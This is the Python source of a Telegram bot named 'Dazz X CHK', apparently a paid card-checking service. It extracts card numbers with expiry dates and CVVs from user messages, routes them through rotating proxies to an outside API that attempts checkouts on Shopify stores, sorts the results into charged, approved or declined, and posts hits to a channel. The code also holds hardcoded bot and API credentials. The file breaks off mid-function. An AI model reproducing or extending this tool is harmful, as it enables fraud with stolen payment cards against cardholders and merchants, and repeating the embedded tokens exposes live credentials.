# 𝘿𝙖𝙯𝙯 𝙓 𝘾𝙃𝙆
from telethon.errors import FloodWaitError
from telethon import TelegramClient, events, Button
from telethon.tl.types import MessageEntityCustomEmoji, ChannelParticipantBanned
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.extensions import html as thtml
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
import string
import logging
import socket
import platform
from datetime import datetime, timedelta
from urllib.parse import urlparse, quote
from telethon.errors import (
    UserNotParticipantError, ChatAdminRequiredError, ChannelPrivateError,
)

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

from database import (
    init_db,
    ensure_user, get_user_plan, set_user_plan, is_premium_user, is_banned_user,
    get_user_expiry, get_users_by_plan,
    add_proxy_db, get_all_user_proxies, get_proxy_count, get_random_proxy,
    remove_proxy_by_index, remove_proxy_by_url, clear_all_proxies,
    add_site_db, get_user_sites, remove_site_db, get_global_sites,
    save_card_to_db, get_total_cards_count, get_charged_count, get_approved_count,
    get_all_premium_users, get_total_users, get_premium_count,
    get_total_sites_count, get_users_with_sites, get_sites_per_user, get_all_sites_detail,
    mark_user_joined, is_user_marked_joined, remove_joined_mark,
    create_key, get_key, claim_key, list_keys,
)

from sitechk import check_site_full

# ====================== LOGGING ======================
log = logging.getLogger("DazzX")
log.setLevel(logging.INFO)
_fmt = logging.Formatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%Y-%m-%d %H:%M:%S')
_ch = logging.StreamHandler(); _ch.setLevel(logging.INFO); _ch.setFormatter(_fmt); log.addHandler(_ch)
try:
    _fh = logging.FileHandler('dazz_x_bot.log', encoding='utf-8'); _fh.setLevel(logging.INFO); _fh.setFormatter(_fmt); log.addHandler(_fh)
except: pass


def log_user(uid, action, msg, level="info"):
    getattr(log, level, log.info)(f"[USER:{uid}] [{action}] {msg}")

def log_system(action, msg, level="info"):
    getattr(log, level, log.info)(f"[SYSTEM] [{action}] {msg}")


# ====================== BOLD SANS ======================
_BOLD_SANS_MAP = {}
_nu, _nl, _nd = "ABCDEFGHIJKLMNOPQRSTUVWXYZ", "abcdefghijklmnopqrstuvwxyz", "0123456789"
_bu = "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭"
_bl = "𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇"
_bd = "𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵"
for _i, _c in enumerate(_nu): _BOLD_SANS_MAP[_c] = _bu[_i]
for _i, _c in enumerate(_nl): _BOLD_SANS_MAP[_c] = _bl[_i]
for _i, _c in enumerate(_nd): _BOLD_SANS_MAP[_c] = _bd[_i]


def bs(text):
    if not text: return text
    return "".join(_BOLD_SANS_MAP.get(c, c) for c in str(text))


# ====================== CONFIG ======================
API_ID = int(os.getenv("API_ID", "36678211"))
API_HASH = os.getenv("API_HASH", "9564bd1816487fd1f9ec422b6f93155a")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8906990326:AAFQoPy7dbmCIgjGDFvLw9OWl0tlRrPhwnc")
ADMIN_ID = json.loads(os.getenv("ADMIN_ID", "[7335579195]"))
HIT_CHANNEL_ID = int(os.getenv("HIT_CHANNEL_ID", "-1004329028711"))
JOIN_GROUP_ID = int(os.getenv("JOIN_GROUP_ID", "-1004329028711"))
JOIN_CHANNEL_ID = int(os.getenv("JOIN_CHANNEL_ID", "-1004341338043"))
JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "https://t.me/GHOSTXCHKHITS")
JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "https://t.me/GHOSTXCHK")
FORCE_JOIN_IMAGES = ["start.jpg", "start.jpg"]
API_BASE_URL = os.getenv("API_BASE_URL", "http://5.175.222.144:8081/shopify")
BOT_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

SP_PER_USER_WORKERS = 30
MSP_PER_USER_WORKERS = 70
SITE_PER_USER_WORKERS = 70
PROXY_PER_USER_WORKERS = 50
BIN_WORKERS = 20

API_TIMEOUT = 120
BIN_TIMEOUT = 60
PROXY_TIMEOUT = 12

SITE_CHECK_BATCH = 40
HIT_DELAY = 1.5
LOG_CHANNEL_ID = HIT_CHANNEL_ID

FREE_SP_DAILY_LIMIT = 2
FREE_SP_COOLDOWN = 10

SUPPORT_LINK = "https://t.me/Dazzelerx"

PLANS = {
    "plan1": {"name": bs("Core Access"),   "tier": "Core",  "duration_days": 7,  "emoji": "🛠️", "price": "$8.00"},
    "plan2": {"name": bs("Elite Access"),  "tier": "Elite", "duration_days": 15, "emoji": "👑", "price": "$14.00"},
    "plan3": {"name": bs("Root Access"),   "tier": "Root",  "duration_days": 30, "emoji": "⭐", "price": "$25.00"},
    "plan4": {"name": bs("X-Access"),      "tier": "X",     "duration_days": 90, "emoji": "💎", "price": "$60.00"},
}
PAID_TIERS = ["Core", "Elite", "Root", "X"]

_USER_SEMS = {}
_BIN_SEM = asyncio.Semaphore(BIN_WORKERS)


def get_user_sem(uid, sem_type="msp"):
    key = f"{uid}_{sem_type}"
    if key not in _USER_SEMS:
        limits = {"sp": SP_PER_USER_WORKERS, "msp": MSP_PER_USER_WORKERS,
                  "site": SITE_PER_USER_WORKERS, "proxy": PROXY_PER_USER_WORKERS}
        _USER_SEMS[key] = asyncio.Semaphore(limits.get(sem_type, 30))
    return _USER_SEMS[key]


def cleanup_user_sem(uid):
    for k in [k for k in _USER_SEMS if k.startswith(f"{uid}_")]:
        del _USER_SEMS[k]


CE = {
    "crown": 5039727497143387500, "bolt": 5042334757040423886,
    "brain": 5040030395416969985, "shield": 5042328396193864923,
    "star": 5042176294222037888, "gem": 5042050649248760772,
    "check": 5039793437776282663, "fire": 5039644681583985437,
    "party": 5039778134807806727, "search": 5039649904264217620,
    "chart": 5042290883949495533, "pin": 5039600026809009149,
    "joker": 5039998939076494446, "plus": 5039891861246838069,
    "cross": 5040042498634810056, "info": 5042306247047513767,
    "gift": 5041975203853239332, "eyes": 5039623284056917259,
    "trash": 5039614900280754969, "tick": 5039844895779455925,
    "stop": 5039671744172917707, "warn": 5039665997506675838,
    "link": 5042101437237036298, "globe": 5042186567783809934,
    "restart": 5413554170668032766, "online": 5413813953685923984,
    "declined": 4956612582816351459,
}
PE = "⭐"

ACTIVE_SESSIONS = {}
ACTIVE_MTXT_PROCESSES = {}
ACTIVE_ADD_PROCESSES = {}
PENDING_ADD_SITES = {}
PENDING_SITE_CHECK = {}
USER_APPROVED_PREF = {}
MAINTENANCE_FILE = "maintenance.json"
_MAINTENANCE_CACHE = {"enabled": None, "last_check": 0}
_JOIN_CACHE = {}
_FREE_SP_USAGE = {}
_FREE_SP_LAST_USE = {}
BOT_START_TIME = time.time()

HIT_BUTTON = [[Button.url(bs("Dazz X CHK"), SUPPORT_LINK)]]

_USER_HTTP_SESSIONS = {}
_GLOBAL_BIN_SESSION = None
_GLOBAL_PROXY_SESSION = None


async def get_user_http_session(uid, purpose="general"):
    key = f"{uid}_{purpose}"
    s = _USER_HTTP_SESSIONS.get(key)
    if s is None or s.closed:
        conn = aiohttp.TCPConnector(limit=150, limit_per_host=50, ttl_dns_cache=300,
                                    use_dns_cache=True, keepalive_timeout=30,
                                    enable_cleanup_closed=True)
        s = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=API_TIMEOUT, connect=10),
            connector=conn
        )
        _USER_HTTP_SESSIONS[key] = s
    return s


async def cleanup_user_http_session(uid, purpose="general"):
    s = _USER_HTTP_SESSIONS.pop(f"{uid}_{purpose}", None)
    if s and not s.closed:
        try: await s.close()
        except: pass


async def get_bin_session():
    global _GLOBAL_BIN_SESSION
    if _GLOBAL_BIN_SESSION is None or _GLOBAL_BIN_SESSION.closed:
        _GLOBAL_BIN_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=BIN_TIMEOUT, connect=5),
            connector=aiohttp.TCPConnector(limit=50, limit_per_host=20,
                                           ttl_dns_cache=300, use_dns_cache=True))
    return _GLOBAL_BIN_SESSION


async def get_proxy_session():
    global _GLOBAL_PROXY_SESSION
    if _GLOBAL_PROXY_SESSION is None or _GLOBAL_PROXY_SESSION.closed:
        _GLOBAL_PROXY_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT, connect=15),
            connector=aiohttp.TCPConnector(limit=30, limit_per_host=10,
                                           ttl_dns_cache=300, use_dns_cache=True))
    return _GLOBAL_PROXY_SESSION


# ====================== FREE USER TRACKER ======================
def _today(): return datetime.now().strftime("%Y-%m-%d")

def get_free_sp_usage(uid):
    e = _FREE_SP_USAGE.get(uid)
    if not e or e.get("date") != _today():
        _FREE_SP_USAGE[uid] = {"date": _today(), "count": 0}
        return 0
    return e["count"]

def increment_free_sp_usage(uid):
    e = _FREE_SP_USAGE.get(uid)
    if not e or e.get("date") != _today():
        _FREE_SP_USAGE[uid] = {"date": _today(), "count": 1}
    else:
        _FREE_SP_USAGE[uid]["count"] += 1

def get_free_sp_cooldown_remaining(uid):
    elapsed = time.time() - _FREE_SP_LAST_USE.get(uid, 0)
    return 0 if elapsed >= FREE_SP_COOLDOWN else round(FREE_SP_COOLDOWN - elapsed, 1)

def set_free_sp_last_use(uid): _FREE_SP_LAST_USE[uid] = time.time()


# ====================== SMART ROTATOR ======================
class SmartRotator:
    def __init__(self):
        self._site_fails = {}; self._proxy_fails = {}
        self._site_idx = 0; self._proxy_idx = 0

    def pick_site(self, sites, exclude=None):
        if not sites: return None
        ex = exclude or set()
        av = [s for s in sites if s not in ex and self._site_fails.get(s, 0) < 5] or \
             [s for s in sites if s not in ex] or list(sites)
        self._site_idx = (self._site_idx + 1) % len(av)
        return av[self._site_idx]

    def pick_proxy(self, proxies, exclude=None):
        if not proxies: return None
        ex = exclude or set()
        av = [p for p in proxies if p.get('proxy_url') not in ex and self._proxy_fails.get(p.get('proxy_url'), 0) < 5] or \
             [p for p in proxies if p.get('proxy_url') not in ex] or list(proxies)
        self._proxy_idx = (self._proxy_idx + 1) % len(av)
        return av[self._proxy_idx]

    def report_site_ok(self, s): self._site_fails[s] = 0
    def report_site_fail(self, s): self._site_fails[s] = self._site_fails.get(s, 0) + 1
    def report_proxy_ok(self, p):
        if p: self._proxy_fails[p] = 0
    def report_proxy_fail(self, p):
        if p: self._proxy_fails[p] = self._proxy_fails.get(p, 0) + 1


# ====================== ERROR KEYWORDS ======================
SITE_ERROR_KEYWORDS = [
    'r4 token empty','payment method is not shopify','r2 id empty','product id is empty',
    'py id empty','clinte token','receipt_empty','receipt id is empty','receipt empty',
    'site requires login','failed to get token','no valid products','not shopify',
    'failed to get checkout','failed to detect product','failed to create checkout',
    'failed to get proposal data','site not supported','site error! status: 429',
    'token not found','handle is empty','payment method identifier is empty',
    'failed to get session token','failed to tokenize card','no_session_token',
    'no session token','no checkout token found','checkout token not found',
    'no checkout token','checkout token is empty','tokenize_fail','tokenize fail',
    'tax ammount empty','tax amount empty','tax amount is empty','del ammount empty',
    'site not supported for now','payment base card not supported','no product found',
    'checkout is not available','cart is empty','cart add failed after retries',
    'checkout_expired','checkout_not_found','no shipping methods available',
    'site error','site dead','site errors','server error','internal server error',
    'internal_server_error','application error','unexpected error','something went wrong',
    'error in 1st req','error in 1 req','error processing card','we could not process',
    'unable to process','payment provider error','payment gateway error',
    'session expired','session invalid','failed after retries','max retries exceeded',
    'all sites dead','all sites unavailable','processinf error','handle error',
    'nonetype',"nonetype' object has no attribute 'get",'unknown error','unknown_error',
    'unknown_result','utm_source','shop is unavailable','store is unavailable',
    'store not found','page not found','this store is unavailable',
    'this shop is currently unavailable','password protected','enter store using password',
    'storefront is password protected','shop closed','store closed',
    'delivery_delivery_line_detail_changed','delivery_address2_required',
    'delivery_line_detail_changed','delivery_line','delivery_address','address_required',
    'submit_rejected','submit rejected:','change proxy or site','change site',
    'fake charge gate','fake gate','hcaptcha detected','hcaptcha_detected',
    'captcha at checkout','captcha_required','captcha required','cloudflare',
    'access denied','permission denied','connection error','connection failed',
    'timed out','timeout','could not resolve host','connect tunnel failed','unreachable',
    'network error','connection reset','empty reply from server','tlsv1 alert',
    'ssl routines','openssl ssl_connect','api_timeout','http error','httperror504',
    '502','503','504','bad gateway','service unavailable','gateway timeout',
    'site error! status: 404','site error! status: 401','amount_too_small',
    'amount too small','merchandise_not_enough_stock','product out of stock',
    'malformed input','url rejected','invalid_response','cart failed with status',
    'invalid json response','invalid json','inventoryreservationfailure',
    'inventory_reservation_failure','payments_positive_amount_expec',
    'payments_payment_flexibility_t','payments_credit_card_brand_not',
    'buyer_identity_presentment_currency',"'products'","error:","error: '",
    'unable to get payment token','empty submit response','empty submit',
    'order_total_changed','order total changed','invalid_payment_method',
    'invalid payment method','validation_custom','validation custom',
    'ARTIFACT_DISSATISFACTION','artifact_dissatisfaction',
    'TAX_NEW_TAX_MUST_BE_ACCEPTED','tax_new_tax_must_be_accepted','PROCESSING_ERROR',
    'processing_error','DELIVERY_COMPANY_REQUIRED','delivery_company_required',
    'DECISION_RULE_BLOCK','decision_rule_block','timeout'
]

PROXY_ERROR_KEYWORDS = ['proxy dead','proxy error','proxy timeout',
                        'proxy connection failed','proxy refused']


def is_site_error(text):
    if not text: return True
    low = text.lower().strip()
    if low == 'na': return True
    return any(kw in low for kw in SITE_ERROR_KEYWORDS)


def is_proxy_error(text):
    if not text: return False
    return any(kw in text.lower().strip() for kw in PROXY_ERROR_KEYWORDS)


def is_truly_alive(response, price):
    if not response: return False
    low = response.lower().strip()
    pc = str(price).replace('$', '').strip() if price else '0'
    try: pv = float(pc)
    except: pv = 0.0
    bad = ['error:', 'error: ', "error: '", 'cart failed', 'invalid json',
           'inventoryreservationfailure', 'payments_positive_amount',
           'payments_payment_flexibility', 'payments_credit_card_brand']
    if any(b in low for b in bad): return False
    if pv == 0.0:
        normal = ['card_declined','card declined','generic_decline','generic decline',
                  'do_not_honor','do not honor','insufficient_funds','insufficient funds',
                  'stolen_card','lost_card','expired_card','expired card','otp_required',
                  'otp required','3d','authentication','cvc','ccn','generic_error',
                  'generic error','restricted_card','fraudulent','not_permitted',
                  'transaction_not_allowed','card_not_supported']
        if not any(n in low for n in normal): return False
    return True


def normalize_site_url(url):
    url = url.strip().lower()
    url = re.sub(r'^https?://', '', url)
    url = url.rstrip('/')
    if url.startswith('www.'): url = url[4:]
    if '/' in url: url = url.split('/')[0]
    return url


# ====================== MESSAGE HELPERS ======================
client_instance = None


def build_entities(html_text, emoji_ids=None):
    text, entities = thtml.parse(html_text)
    if emoji_ids:
        idx, utf16_pos = 0, 0
        for ch in text:
            if ch == PE and idx < len(emoji_ids):
                entities.append(MessageEntityCustomEmoji(offset=utf16_pos, length=1, document_id=emoji_ids[idx]))
                idx += 1
            utf16_pos += 2 if ord(ch) > 0xFFFF else 1
    return text, sorted(entities, key=lambda e: e.offset)


async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            event.reply(text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False),
            timeout=15)
    except asyncio.TimeoutError:
        return None
    except:
        try:
            return await asyncio.wait_for(event.reply(html_text[:4000], parse_mode='html', link_preview=False), timeout=10)
        except: return None


async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None, file=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        return await asyncio.wait_for(
            client_instance.send_message(chat_id, text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False),
            timeout=15)
    except: return None


async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
    try:
        text, entities = build_entities(html_text, emoji_ids)
        await asyncio.wait_for(msg.edit(text, formatting_entities=entities, buttons=buttons, link_preview=False), timeout=8)
    except: pass


def pbtn(text, data=None, url=None):
    if url: return Button.url(text, url)
    if data: return Button.inline(text, data.encode() if isinstance(data, str) else data)
    return Button.inline(text, b"none")


# ====================== CARD FORMATTERS ======================
def format_card_result(status, card, gateway, response, price="-", site="-", bin_info=None, elapsed=0.0):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
        "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]]),
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand":"-","type":"-","level":"-","bank":"-","country":"-","flag":"🏳️"}
    ps = f"${str(price).replace('$', '')}" if price and price != "-" else "-"
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='https://t.me/Dazzelerx'>𝘿</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>
<b>{bs('Price')}</b> ━ <code>{ps}</code>
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand','-')} | {bi.get('type','-')} | {bi.get('level','-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank','-')}</code>
<b>{bs('Country')}:</b> <code>{bi.get('country','-')} {bi.get('flag','🏳️')}</code>

<b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>""", he


def format_simple_card_result(status, card, gateway, response, bin_info=None, elapsed=0.0, extra_field=None):
    sm = {
        "Charged": (f"<b>{bs('CHARGED')}</b> {PE}", [CE["fire"]]),
        "Approved": (f"<b>{bs('APPROVED')}</b> {PE}", [CE["check"]]),
        "Declined": (f"<b>{bs('DECLINED')}</b> {PE}", [CE["declined"]]),
        "Error": (f"<b>{bs('ERROR')}</b> {PE}", [CE["cross"]]),
    }
    h, he = sm.get(status, sm["Declined"])
    bi = bin_info or {"brand":"-","type":"-","level":"-","bank":"-","country":"-","flag":"🏳️"}
    el = f"\n<b>{bs(extra_field[0])}</b> ━ <code>{extra_field[1]}</code>" if extra_field else ""
    return f"""{h}
<b>━━━━━━━━━━━━━━━━━</b>
<a href='https://t.me/Dazzelerx'>𝘿</a> <b>{bs('Card')}</b>
⤷ <code>{card}</code>
<b>{bs('Gateway')}</b> ━ <code>{gateway}</code>
<b>{bs('Response')}</b> ━ <code>{response}</code>{el}
<b>━━━━━━━━━━━━━━━━━</b>
<b>{bs('BIN')}:</b> <code>{bi.get('brand','-')} | {bi.get('type','-')} | {bi.get('level','-')}</code>
<b>{bs('Bank')}:</b> <code>{bi.get('bank','-')}</code>
<b>{bs('Country')}:</b> <code>{bi.get('country','-')} {bi.get('flag','🏳️')}</code>

<b>{bs('Took')}</b> ⏱ <code>{elapsed:.2f}{bs('s')}</code>""", he


# ====================== FORCE JOIN ======================
async def is_user_joined(user_id):
    if user_id in ADMIN_ID: return True
    now = time.time()
    if _JOIN_CACHE.get(user_id) and now - _JOIN_CACHE[user_id] < 600:
        return True
    for cid in [JOIN_GROUP_ID, JOIN_CHANNEL_ID]:
        try:
            r = await client_instance(GetParticipantRequest(channel=cid, participant=user_id))
            if isinstance(r.participant, ChannelParticipantBanned): return False
        except UserNotParticipantError: return False
        except (ChatAdminRequiredError, ChannelPrivateError): pass
        except: pass
    _JOIN_CACHE[user_id] = now
    return True


async def force_join_check(event):
    if event.sender_id in ADMIN_ID: return True
    if await is_user_joined(event.sender_id): return True
    _JOIN_CACHE.pop(event.sender_id, None)
    await remove_joined_mark(event.sender_id)
    buttons = [
        [pbtn(bs("Join Channel"), url=JOIN_CHANNEL_LINK)],
        [pbtn(bs("Join Group"), url=JOIN_GROUP_LINK)],
        [pbtn(bs("I have joined"), data="check_joined")],
    ]
    text = f"""{PE} <b>{bs('Access Locked')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Join Both Chats to Unlock')}</b>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Channel')}:</b> <i>{bs('DAZZ X CHANNEL')}</i>
{PE} <b>{bs('Group')}:</b> <i>{bs('DAZZ X Chat')}</i>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('All Features Restricted')}</b>"""
    try:
        await styled_reply(event, text, buttons=buttons,
                           emoji_ids=[CE["fire"], CE["fire"], CE["stop"], CE["link"], CE["info"], CE["warn"]],
                           file=random.choice(FORCE_JOIN_IMAGES))
    except:
        await styled_reply(event, text, buttons=buttons,
                           emoji_ids=[CE["fire"], CE["fire"], CE["stop"], CE["link"], CE["info"], CE["warn"]])
    return False


# ====================== MAINTENANCE ======================
async def set_maintenance_mode(enabled):
    global _MAINTENANCE_CACHE
    try:
        async with aiofiles.open(MAINTENANCE_FILE, "w") as f:
            await f.write(json.dumps({"maintenance": enabled}))
        _MAINTENANCE_CACHE = {"enabled": enabled, "last_check": time.time()}
    except: pass


async def get_maintenance_mode():
    global _MAINTENANCE_CACHE
    now = time.time()
    if _MAINTENANCE_CACHE["enabled"] is not None and now - _MAINTENANCE_CACHE["last_check"] < 30:
        return _MAINTENANCE_CACHE["enabled"]
    try:
        if not os.path.exists(MAINTENANCE_FILE): return False
        async with aiofiles.open(MAINTENANCE_FILE, "r") as f:
            data = json.loads(await f.read())
            _MAINTENANCE_CACHE = {"enabled": data.get("maintenance", False), "last_check": now}
            return _MAINTENANCE_CACHE["enabled"]
    except: return False


async def check_maintenance(event):
    if await get_maintenance_mode() and event.sender_id not in ADMIN_ID:
        await styled_reply(event, f"""{PE} <b>{bs('Maintenance')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Bot under maintenance')}</b>
{PE} <i>{bs('Try again later')}</i>""",
            emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["info"]])
        return True
    return False


# ====================== ACCESS ======================
async def can_use(user_id, chat):
    await ensure_user(user_id)
    if await is_banned_user(user_id): return False, "banned"
    plan = (await get_user_plan(user_id)).title()
    return True, f"{plan}_private" if chat.id == user_id else f"{plan}_group"


async def get_user_access(event):
    await ensure_user(event.sender_id)
    if await is_banned_user(event.sender_id): return False, "banned", "Bronze"
    plan = (await get_user_plan(event.sender_id)).title()
    return True, f"{plan}_private" if event.chat.id == event.sender_id else f"{plan}_group", plan


def get_cc_limit(plan, uid=None):
    if uid and uid in ADMIN_ID:
        return 999_999_999     # admin → unlimited
    p = plan.title() if plan else "Bronze"
    if p == "X": return 10000
    if p == "Root": return 5000
    if p == "Elite": return 2500
    if p == "Core": return 1500
    return 0


def is_paid_plan(plan): return plan.title() in PAID_TIERS if plan else False


async def send_group_only_message(event):
    return await styled_reply(event, f"""{PE} <b>{bs('Group Only')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Free users')} → {bs('group only')}</b>
{PE} <i>{bs('Upgrade for private access')}</i>""",
        emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["gem"]])


async def send_premium_only_message(event):
    return await styled_reply(event, f"""{PE} <b>{bs('Premium Only')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('This feature requires an active plan')}</b>
{PE} <i>{bs('Use /plan to see available plans')}</i>""",
        buttons=[[pbtn(bs("Upgrade"), url=SUPPORT_LINK)]],
        emoji_ids=[CE["stop"], CE["stop"], CE["warn"], CE["info"]])


def banned_user_message():
    return f"""{PE} <b>{bs('Banned')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Not allowed')}</b>
{PE} <b>{bs('Appeal')}:</b> <i>{bs('Contact Admin')}</i>""", [CE["stop"], CE["stop"], CE["warn"], CE["info"]]


# ====================== UTILITIES ======================
def extract_cc(text):
    if not text: return []
    cards = []
    for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2,4})[\s|/\\:]+(\d{3,4})', text):
        if len(y) == 2: y = '20' + y
        cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text):
            cards.append(f"{c}|{m}|{y}|{cv}")
    if not cards:
        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text):
            cards.append(f"{c}|{m}|20{y}|{cv}")
    return list(dict.fromkeys(cards))


def is_valid_url_or_domain(url):
    d = url.lower()
    if d.startswith(('http://', 'https://')):
        try: d = urlparse(url).netloc
        except: return False
    return bool(re.match(r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$', d))


def extract_urls_from_text(text):
    seen, result = set(), []
    for line in text.split('\n'):
        line = line.strip()
        if not line: continue
        m = re.match(r'(https?://[^\s{(]+)', line)
        if m:
            n = normalize_site_url(m.group(1).rstrip('/'))
            if n and is_valid_url_or_domain(n) and n not in seen:
                seen.add(n); result.append(n)
            continue
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line).split(' ')[0].split('{')[0].strip()
        if cleaned:
            n = normalize_site_url(cleaned)
            if n and is_valid_url_or_domain(n) and n not in seen:
                seen.add(n); result.append(n)
    return result


def parse_proxy_format(proxy):
    proxy = proxy.strip()
    pt = 'http'
    pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if pm: pt, proxy = pm.group(1).lower(), pm.group(2)
    h = p = u = pw = ''
    m = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if m: u, pw, h, p = m.groups()
    elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
        m2 = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        ph, pp, pu, ppw = m2.groups()
        if 0 < int(pp) <= 65535: h, p, u, pw = ph, pp, pu, ppw
    elif re.match(r'^([^:@]+):(\d+)$', proxy):
        m3 = re.match(r'^([^:@]+):(\d+)$', proxy); h, p = m3.groups()
    else: return None
    if not h or not p: return None
    try:
        if not (0 < int(p) <= 65535): return None
    except: return None
    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
    return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None,
            'proxy_url': pu, 'type': pt}


async def test_proxy(proxy_url):
    try:
        s = await get_proxy_session()
        async with s.get('http://api.ipify.org?format=json', proxy=proxy_url,
                         timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT)) as r:
            if r.status == 200: return True, (await r.json()).get('ip', '?')
            return False, None
    except Exception as e: return False, str(e)


async def get_bin_info(cn):
    try:
        s = await get_bin_session()
        async with _BIN_SEM:
            async with s.get(f'https://bins.antipublic.cc/bins/{cn[:6]}') as r:
                if r.status != 200:
                    return {"brand":"-","type":"-","level":"-","bank":"-","country":"-","flag":"🏳️"}
                d = await r.json(content_type=None)
                return {"brand": d.get('brand','-'), "type": d.get('type','-'),
                        "level": d.get('level','-'), "bank": d.get('bank','-'),
                        "country": d.get('country_name','-'), "flag": d.get('country_flag','🏳️')}
    except:
        return {"brand":"-","type":"-","level":"-","bank":"-","country":"-","flag":"🏳️"}


# ====================== SHOPIFY CARD CHECK ======================
def build_api_url(site, cc, proxy_data=None):
    if not site.startswith('http'): site = f'https://{site}'
    url = f'{API_BASE_URL}?site={quote(site, safe="")}&cc={quote(cc, safe="")}'
    if proxy_data:
        ip, port = proxy_data['ip'], proxy_data['port']
        un, pw = proxy_data.get('username'), proxy_data.get('password')
        ps = f"{ip}:{port}:{un}:{pw}" if un and pw else f"{ip}:{port}"
        url += f'&proxy={quote(ps, safe="")}'
    return url


def classify_response(rj):
    ar = str(rj.get('Response', ''))
    if ar.upper() == 'DS_REQUIRED': ar = '3DS_REQUIRED'
    st = rj.get('Status', False)
    price = rj.get('Price', '-')
    gw = rj.get('Gate', rj.get('Gateway', 'Shopify'))
    if price is not None and price != '-': price = f"${price}"
    rl = ar.lower()
    if is_site_error(ar) or is_proxy_error(ar):
        return {"Response": ar, "Price": price, "Gateway": gw, "Status": "SiteError"}
    ch = ['order_paid','order_placed','order_confirmed','thank you','payment successful',
          'order_completed','charged','order_created','order confirmed']
    ap = ['otp_required','otp required','3d_authentication','3ds_required','3d required',
          '3d_redirect','authentication_required','insufficient_funds','insufficient funds',
          'cvc','ccn','ccn live cvv']
    dc = ['generic_decline','generic decline','do_not_honor','do not honor','stolen_card',
          'lost_card','pickup_card','pick_up_card','restricted_card','restricted card',
          'fraudulent','fraud suspected','fraud_suspected','expired_card','expired card',
          'transaction_not_allowed','transaction not allowed','card_declined','card declined',
          'processor_declined','processor declined','card_not_supported','card not supported',
          'currency_not_supported','duplicate_transaction','revocation_of_authorization',
          'no_action_taken','try_again_later','not_permitted','decline','your card was declined',
          'payment_intent_authentication_failure','avs_check_failed','incorrect number',
          'incorrect_number','invalid','invalid_number','decision_rule_block','generic_error']
    if any(k in rl for k in ch): return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Charged"}
    if any(k in rl for k in ap): return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Approved"}
    if any(k in rl for k in dc): return {"Response": ar, "Price": price, "Gateway": gw, "Status": "Declined"}
    if st is True and not any(w in rl for w in ["decline","denied","failed","error","rejected","refused","fraud"]):
